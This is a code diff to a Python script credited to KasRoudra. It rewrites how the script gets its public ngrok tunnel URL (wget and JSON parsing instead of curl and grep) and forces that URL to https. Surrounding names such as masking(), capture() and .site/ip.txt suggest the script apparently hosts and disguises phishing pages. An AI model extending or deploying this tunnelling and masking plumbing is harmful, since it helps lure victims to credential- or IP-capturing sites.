@@ -83,7 +83,7 @@ modification follow.
 Copyright (C) 2021 KasRoudra (https://github.com/KasRoudra)
 """
 
-import os, sys, time, socket
+import os, sys, time, socket, json
 from urllib.request import urlretrieve
 from os import popen, system
 from time import sleep
@@ -481,11 +481,20 @@ def masking(ngurl):
 # Output urls and ask for custom masking
 def capture():
     internet()
-    ngurl=os.popen("curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[0-9a-z]*\.ngrok.io'").read()
+    os.system("wget -O tunnels.json http://localhost:4040/api/tunnels > /dev/null 2>&1")
+    with open('tunnels.json') as data_file:    
+        datajson = json.load(data_file)
+    os.remove("tunnels.json")
+    os.system("rm -rf "+root+"/.site/ip.txt")
+    for i in datajson['tunnels']:
+       ngurl = i['public_url']
     if ngurl=="":
         sprint(error+"Ngrok Error!")
         killer()
         exit(1)
+    if not ngurl.find("https")!=-1:      
+        ngurl=ngurl.replace("http","https")   
+
     with open(root+"/.site/.info.txt", "r") as inform:
         masked=inform.read()
         
@@ -671,7 +680,7 @@ def requirements(folder,mask):
                 capture()
             else:
                 sleep(1)        
-        sprint(error+"Ngrok error!")
+        sprint("\n"+error+"Ngrok can't start!")
         killer()
         exit(1)
 main()
